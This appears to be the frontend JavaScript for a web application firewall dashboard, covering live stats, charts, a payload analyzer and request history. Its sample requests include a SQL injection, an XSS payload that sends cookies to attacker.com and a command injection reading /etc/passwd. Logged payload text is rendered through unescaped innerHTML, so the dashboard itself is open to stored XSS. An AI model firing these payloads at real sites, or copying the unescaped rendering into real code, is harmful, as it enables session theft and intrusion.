/**
 * TransWAF Dashboard — Frontend Logic
 * - Tab navigation
 * - Live stat polling via /stats
 * - Attack distribution & action breakdown charts (Chart.js)
 * - Payload analyzer with attention heatmap
 * - Request history table with pagination
 */

const API = '';  // Same origin; change to http://localhost:8000 for dev

// ── Utility ───────────────────────────────────────────────

const $ = id => document.getElementById(id);
const fmt = n => n?.toLocaleString?.() ?? n;
const fmtConf = c => `${(c * 100).toFixed(1)}%`;
const fmtLat  = l => `${l?.toFixed(1) ?? '—'}ms`;

function timeAgo(iso) {
  try {
    const diff = (Date.now() - new Date(iso).getTime()) / 1000;
    if (diff < 60)   return `${Math.floor(diff)}s ago`;
    if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
    return new Date(iso).toLocaleTimeString();
  } catch { return ''; }
}

function actionBadge(action) {
  const map = { BLOCK: 'badge-block', FLAG: 'badge-flag', ALLOW: 'badge-allow' };
  return `<span class="badge ${map[action] || ''}">${action}</span>`;
}

function labelBadge(label) {
  return `<span class="badge badge-${label}">${label.replace('_', ' ')}</span>`;
}

function threatBadge(t) {
  const map = { CRITICAL: 'badge-critical', HIGH: 'badge-high', MEDIUM: 'badge-medium', NONE: 'badge-none' };
  return `<span class="badge ${map[t] || ''}">${t}</span>`;
}

// ── Tab Navigation ────────────────────────────────────────

document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', e => {
    e.preventDefault();
    const tab = item.dataset.tab;
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    item.classList.add('active');
    document.getElementById(`tab-${tab}`)?.classList.add('active');
    document.getElementById('pageTitle').textContent =
      item.textContent.trim().replace(/^[^ ]+ /, '');

    if (tab === 'history') loadHistory();
  });
});

// ── Chart.js Setup ────────────────────────────────────────

Chart.defaults.color = '#8892a4';
Chart.defaults.borderColor = 'rgba(255,255,255,0.07)';
Chart.defaults.font.family = "'Inter', sans-serif";

const ATTACK_COLORS = {
  benign:         '#22c55e',
  sqli:           '#ef4444',
  xss:            '#f59e0b',
  cmdi:           '#c084fc',
  path_traversal: '#6366f1',
  rce:            '#f87171',
};

let attackChart, actionChart;

function initCharts() {
  // Attack distribution doughnut
  const attackCtx = $('attackChart').getContext('2d');
  attackChart = new Chart(attackCtx, {
    type: 'doughnut',
    data: {
      labels: ['No Data'],
      datasets: [{
        data: [1],
        backgroundColor: ['rgba(255,255,255,0.06)'],
        borderWidth: 0,
        hoverOffset: 8,
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      cutout: '70%',
      plugins: {
        legend: { position: 'right', labels: { padding: 16, font: { size: 11 } } },
        tooltip: {
          callbacks: {
            label: ctx => ` ${ctx.label}: ${fmt(ctx.raw)} requests`
          }
        }
      }
    }
  });

  // Action breakdown bar
  const actionCtx = $('actionChart').getContext('2d');
  actionChart = new Chart(actionCtx, {
    type: 'bar',
    data: {
      labels: ['BLOCK', 'FLAG', 'ALLOW'],
      datasets: [{
        label: 'Requests',
        data: [0, 0, 0],
        backgroundColor: [
          'rgba(239,68,68,0.7)',
          'rgba(245,158,11,0.7)',
          'rgba(34,197,94,0.7)',
        ],
        borderRadius: 6,
        borderSkipped: false,
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        y: {
          beginAtZero: true,
          grid: { color: 'rgba(255,255,255,0.05)' },
          ticks: { precision: 0 }
        },
        x: { grid: { display: false } }
      }
    }
  });
}

// ── Stats Polling ─────────────────────────────────────────

let lastTotal = 0;
const feedItems = [];

async function pollStats() {
  try {
    const res = await fetch(`${API}/stats`);
    if (!res.ok) throw new Error(res.statusText);
    const data = await res.json();

    // Update stat cards
    $('statTotal').textContent   = fmt(data.total_requests);
    $('statBlocked').textContent = fmt(data.blocked);
    $('statFlagged').textContent = fmt(data.flagged);
    $('statAllowed').textContent = fmt(data.allowed);
    $('statLatency').textContent = data.avg_latency_ms ? fmtLat(data.avg_latency_ms) : '—';

    // Update device badge
    const dev = data.model_info?.device || 'cpu';
    $('deviceBadge').textContent = dev.includes('cuda') ? '🔥 GPU' : '💻 CPU';

    // Update mode badge
    if (data.model_info?.demo_mode) {
      $('modeBadge').innerHTML = '<span class="pulse"></span> DEMO';
    }

    // Update charts
    updateAttackChart(data.attack_breakdown || {});
    updateActionChart(data.blocked, data.flagged, data.allowed);

    // Status indicator
    $('statusDot').classList.add('online');
    $('statusDot').classList.remove('offline');
    $('statusText').textContent = 'API Online';

    // Refresh feed if new requests came in
    if (data.total_requests > lastTotal) {
      lastTotal = data.total_requests;
      loadFeed();
    }
  } catch (err) {
    $('statusDot').classList.remove('online');
    $('statusDot').classList.add('offline');
    $('statusText').textContent = 'API Offline';
  }
}

function updateAttackChart(breakdown) {
  const labels = Object.keys(breakdown);
  const values = Object.values(breakdown);
  if (labels.length === 0) return;

  attackChart.data.labels = labels.map(l => l.replace('_', ' '));
  attackChart.data.datasets[0].data = values;
  attackChart.data.datasets[0].backgroundColor = labels.map(
    l => ATTACK_COLORS[l] || '#8892a4'
  );
  attackChart.update('none');
}

function updateActionChart(blocked, flagged, allowed) {
  actionChart.data.datasets[0].data = [blocked || 0, flagged || 0, allowed || 0];
  actionChart.update('none');
}

// ── Live Alert Feed ───────────────────────────────────────

async function loadFeed() {
  try {
    const res = await fetch(`${API}/history?page=1&page_size=20`);
    if (!res.ok) return;
    const data = await res.json();
    const feed = $('alertFeed');

    if (!data.items?.length) {
      feed.innerHTML = '<div class="feed-empty">No alerts yet. Send requests to /classify to see them here.</div>';
      return;
    }

    feed.innerHTML = data.items.map(item => `
      <div class="feed-item">
        <span class="feed-time">${timeAgo(item.timestamp)}</span>
        <span class="feed-text">${item.normalized_text?.substring(0, 80) || '—'}</span>
        ${labelBadge(item.label)}
        ${actionBadge(item.action)}
        <span class="feed-lat">${fmtLat(item.latency_ms)}</span>
      </div>
    `).join('');
  } catch {}
}

// ── Payload Analyzer ─────────────────────────────────────

const EXAMPLES = {
  sqli: `GET /search?q=1'+UNION+SELECT+null,table_name+FROM+information_schema.tables-- HTTP/1.1\r\nHost: victim.example.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\r\nCookie: session=abc123\r\n\r\n`,
  xss:  `POST /comment HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nbody=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`,
  cmdi: `GET /ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n`,
  benign: `GET /products?category=electronics&sort=price_asc&page=2 HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)\r\nAccept: text/html,application/xhtml+xml\r\n\r\n`,
};

function loadExample(type) {
  $('rawRequestInput').value = EXAMPLES[type] || '';
}

async function analyzeRequest() {
  const raw = $('rawRequestInput').value.trim();
  if (!raw) { alert('Please enter an HTTP request.'); return; }

  const btn = $('analyzeBtnText');
  btn.textContent = '⏳ Analyzing...';
  document.querySelector('.btn-primary').disabled = true;

  try {
    const res = await fetch(`${API}/classify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ raw_request: raw, explain: true }),
    });

    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      throw new Error(err.detail || `HTTP ${res.status}`);
    }

    const data = await res.json();
    renderResult(data);
  } catch (err) {
    alert(`Error: ${err.message}\n\nMake sure the TransWAF API is running on port 8000.`);
  } finally {
    btn.textContent = '⚡ Analyze Request';
    document.querySelector('.btn-primary').disabled = false;
  }
}

function renderResult(data) {
  const panel = $('resultPanel');
  panel.classList.remove('hidden');

  // Action badge color
  const actionEl = $('resultActionBadge');
  actionEl.textContent = data.action;
  actionEl.className = 'result-action-badge badge ' + {
    BLOCK: 'badge-block', FLAG: 'badge-flag', ALLOW: 'badge-allow'
  }[data.action] || '';

  // Label & confidence
  $('resultLabel').textContent = data.label_display || data.label;
  $('confBarFill').style.width = `${data.confidence * 100}%`;
  const actionColors = { BLOCK: '#ef4444', FLAG: '#f59e0b', ALLOW: '#22c55e' };
  $('confBarFill').style.background = actionColors[data.action] || '#4f8ef7';
  $('resultConfidence').textContent =
    `Confidence: ${fmtConf(data.confidence)} | Threat: ${data.threat_level}`;

  // Per-class scores
  const scoresEl = $('resultScores');
  const scores = data.all_scores || {};
  const sortedScores = Object.entries(scores).sort((a,b) => b[1] - a[1]);
  scoresEl.innerHTML = sortedScores.map(([label, val]) => {
    const color = ATTACK_COLORS[label] || '#8892a4';
    return `
      <div class="score-row">
        <span class="score-name">${label.replace('_',' ')}</span>
        <div class="score-bar-wrap">
          <div class="score-bar-fill" style="width:${val*100}%;background:${color}"></div>
        </div>
        <span class="score-pct">${(val*100).toFixed(1)}%</span>
      </div>
    `;
  }).join('');

  // Attention heatmap
  const heatmapEl = $('heatmapTokens');
  const saliency = data.saliency || {};
  if (Object.keys(saliency).length > 0) {
    const maxScore = Math.max(...Object.values(saliency));
    heatmapEl.innerHTML = Object.entries(saliency)
      .sort((a,b) => b[1]-a[1])
      .map(([token, score]) => {
        const intensity = score / (maxScore || 1);
        const alpha = 0.15 + intensity * 0.65;
        const color = data.action === 'ALLOW' ? '34,197,94' : '239,68,68';
        const textColor = intensity > 0.6 ? '#fff' : '#ccc';
        return `<span class="heatmap-token" 
          style="background:rgba(${color},${alpha.toFixed(2)});color:${textColor};border-color:rgba(${color},0.3)"
          title="Saliency: ${(score*100).toFixed(1)}%">${token}</span>`;
      }).join('');
  } else {
    heatmapEl.innerHTML = '<span style="color:var(--text-muted);font-size:0.8rem">Saliency not available (demo mode or training model)</span>';
  }

  // Normalized text
  $('normalizedText').textContent = data.normalized_text || '—';

  // Meta
  $('resultLatency').textContent = fmtLat(data.latency_ms);
  $('resultId').textContent = data.request_id || '—';

  // Scroll to result
  panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// ── History Table ─────────────────────────────────────────

let historyPage = 1;

async function loadHistory(page = 1) {
  historyPage = page;
  const filter = $('historyFilter')?.value || '';
  const url = `${API}/history?page=${page}&page_size=20${filter ? `&action=${filter}` : ''}`;

  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error();
    const data = await res.json();
    renderHistoryTable(data);
  } catch {
    $('historyBody').innerHTML = '<tr><td colspan="8" class="table-empty">Failed to load history. Is the API running?</td></tr>';
  }
}

function renderHistoryTable(data) {
  const body = $('historyBody');
  if (!data.items?.length) {
    body.innerHTML = '<tr><td colspan="8" class="table-empty">No requests logged yet.</td></tr>';
    $('pagination').innerHTML = '';
    return;
  }

  body.innerHTML = data.items.map(item => `
    <tr>
      <td>${item.id}</td>
      <td><code style="font-size:0.73rem;color:var(--text-muted)">${new Date(item.timestamp).toLocaleTimeString()}</code></td>
      <td>${labelBadge(item.label)}</td>
      <td class="td-conf">${fmtConf(item.confidence)}</td>
      <td>${actionBadge(item.action)}</td>
      <td>${threatBadge(item.threat_level)}</td>
      <td class="td-lat">${fmtLat(item.latency_ms)}</td>
      <td class="td-preview" title="${item.normalized_text}">${item.normalized_text?.substring(0, 60) || '—'}</td>
    </tr>
  `).join('');

  // Pagination
  const totalPages = Math.ceil(data.total / data.page_size);
  let pag = '';
  if (historyPage > 1) {
    pag += `<button class="btn-ghost" onclick="loadHistory(${historyPage-1})">← Prev</button>`;
  }
  pag += `<span style="color:var(--text-secondary);font-size:0.8rem;padding:6px 12px">Page ${historyPage} / ${totalPages || 1}</span>`;
  if (historyPage < totalPages) {
    pag += `<button class="btn-ghost" onclick="loadHistory(${historyPage+1})">Next →</button>`;
  }
  $('pagination').innerHTML = pag;
}

// ── Init ──────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', () => {
  initCharts();
  pollStats();

  // Poll every 3 seconds
  setInterval(pollStats, 3000);
});
